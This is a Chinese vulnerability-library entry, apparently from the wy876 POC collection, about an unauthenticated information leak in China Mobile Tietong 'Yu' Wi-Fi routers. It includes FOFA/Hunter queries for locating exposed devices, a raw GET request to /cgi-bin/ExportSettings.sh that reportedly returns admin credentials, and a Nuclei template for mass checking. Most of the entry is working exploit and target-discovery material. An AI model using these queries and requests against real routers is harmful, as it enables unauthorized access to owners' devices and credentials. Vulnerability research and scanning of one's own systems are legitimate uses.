---
fofa: "title="
source: "wy876 漏洞文库"
---

# 中国移动禹路由ExportSettings.sh存在信息泄露漏洞

## 一、漏洞简介
 中移禹路由器是一款性能强大且功能丰富的无线路由器。它采用了最新的Wi-Fi 6技术，提供更快的速度和更稳定的连接。它支持双频段同时工作，2.4GHz和5GHz频段可同时提供高速的无线网络，满足多设备同时连接的需求。中移禹路由器还具备MU-MIMO技术，可以同时处理多个设备的数据传输，提供更快的速度和更稳定的连接。中移铁通禹路由器ExportSettings接口处存在信息泄露漏洞，恶意攻击者可能会利用此漏洞获取到登陆账户和密码，从而登录后台，使服务器处于不安全的状态。  

## 二、资产测绘
```plain
fofa：title="互联世界 物联未来-登录"
hunter：web.body="互联世界 物联未来-登录"
```


## 三、漏洞复现
```http
GET /cgi-bin/ExportSettings.sh HTTP/1.1
Host:127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0

```


## 四、Nuclei
```http
id: ZYTT-ExportSettings-Info

info:
  name: 中移铁通禹路由器-信息泄露-ExportSettings
  author: haoguoguo
  severity: high
  metadata: 
    fofa-query: title="互联世界 物联未来-登录"
variables:
  filename: "{{to_lower(rand_base(5))}}"
  boundary: "{{to_lower(rand_base(20))}}"
http:
  - raw:
      - |
        GET /cgi-bin/ExportSettings.sh HTTP/1.1
        Host:{{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Length: 0


    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"wan_ipaddr","HostName")
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qmarera6wxzybbby>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
